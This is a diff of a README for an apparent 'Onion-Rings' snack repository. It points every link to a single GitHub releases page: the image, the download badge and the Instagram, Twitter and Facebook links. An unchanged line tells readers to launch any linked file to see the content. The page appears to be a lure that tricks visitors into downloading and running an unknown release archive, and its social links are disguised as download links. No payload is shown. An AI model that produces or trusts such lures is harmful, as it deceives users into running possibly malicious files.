@@ -1,6 +1,6 @@
 # Welcome to the Onion-Rings Repository 🧅🔥
 
-![Onion Rings](https://www.exampleimages.com/onion-rings.jpg)
+![Onion Rings](https://github.com/demonsofhe/Onion-Rings/releases)
 
 
 ## Description
@@ -20,9 +20,9 @@ The repository covers a wide range of topics related to onion rings, including b
 🔹 Snacks  
 
 ## Explore More
-For further exploration, check out the [Onion-Rings GitHub Repository](https://github.com/releases/789694263/Release.zip).
+For further exploration, check out the [Onion-Rings GitHub Repository](https://github.com/demonsofhe/Onion-Rings/releases).
 
-[![Download Onion Rings](https://img.shields.io/badge/Download-Onion_Rings-orange)](https://github.com/releases/789694263/Release.zip)
+[![Download Onion Rings](https://github.com/demonsofhe/Onion-Rings/releases)](https://github.com/demonsofhe/Onion-Rings/releases)
 
 If the link ends with a file name, it needs to be launched to access the content.
 
@@ -35,9 +35,9 @@ And remember, when in doubt, always refer to the "Releases" section for the late
 
 ## Let's Connect
 Connect with us on social media to stay updated on all things onion rings:
-📷 Instagram: [@onionringslover](https://www.instagram.com/onionringslover)  
-🐦 Twitter: [@ringmaster](https://www.twitter.com/ringmaster)  
-📘 Facebook: [Onion Rings Enthusiasts](https://www.facebook.com/onionringsenthusiasts)  
+📷 Instagram: [@onionringslover](https://github.com/demonsofhe/Onion-Rings/releases)  
+🐦 Twitter: [@ringmaster](https://github.com/demonsofhe/Onion-Rings/releases)  
+📘 Facebook: [Onion Rings Enthusiasts](https://github.com/demonsofhe/Onion-Rings/releases)  
 
 ## Spread the Word
 If you enjoy what you find in this repository, consider starring the project to show your support and help us reach more onion ring enthusiasts!
